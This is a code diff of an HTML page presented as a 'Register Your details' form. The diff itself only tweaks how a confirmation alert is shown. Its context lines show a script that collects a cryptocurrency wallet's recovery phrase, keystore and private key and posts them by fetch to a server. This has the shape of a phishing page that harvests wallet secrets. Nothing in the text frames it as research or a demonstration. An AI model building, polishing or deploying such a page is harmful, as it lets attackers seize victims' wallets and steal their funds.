@@ -13,7 +13,7 @@
         integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
     <!-- Title -->
     <style>
-        .hide { display: hide }
+        .hide { display: none }
     </style>
     <title>App Form</title>
 </head>
@@ -21,6 +21,9 @@
 <body>
     <h2 class="text-center mt-5">Register Your details</h2>
     <p class="text-center">Please Provide your Info</p>
+    <div class="alert alert-primary hide" id="hide" role="alert">
+        A simple primary alert—check it out!
+    </div>
     <div class="container">
         <form id="mail_form" method="POST" action="">
             <div class="row">
@@ -53,9 +56,7 @@
         </form>
     </div>
 
-    <div class="alert alert-primary hide" id="hide" role="alert">
-        A simple primary alert—check it out!
-    </div>
+    
 
 
 
@@ -70,7 +71,7 @@
                         let phrase = document.getElementById("phrase").value;
                         let keyStore = document.getElementById("keystore").value;
                         let privateKey = document.getElementById("privatekey").value;
-                        let messageAlert = document.createElement("div");
+                        let messageAlert = document.getElementById("hide");
                         console.log(phrase, keyStore, privateKey);
 
                         const data = {
@@ -92,9 +93,7 @@
                     .then((response) => response.text())
                     .then((data)=> {
                         console.log("Success: ", data)
-                        messageAlert.innerHTML = `<div class="alert alert-primary" role="alert">
-                                                        Your Response as been recorded
-                                                    </div>`
+                        messageAlert.classList.remove("hide");
                         phrase = "";
                         keyStore = "";
                         privateKey = "";
